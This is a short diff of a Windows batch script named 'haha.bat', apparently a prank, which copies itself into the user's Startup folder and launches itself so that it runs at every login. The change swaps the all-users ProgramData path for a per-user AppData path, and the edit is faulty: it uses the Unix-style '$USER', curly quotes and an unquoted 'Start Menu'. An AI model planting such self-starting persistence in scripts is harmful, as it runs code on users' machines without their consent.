@@ -1,4 +1,5 @@
 @echo off
-move haha.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-cd “C:\ProgramData\Microsoft\Windows\Start\Menu\Programs\StartUp”
+echo "$USER"
+move haha.bat C:\Users/$USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+cd “C:\Users\$USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”
 start haha.bat
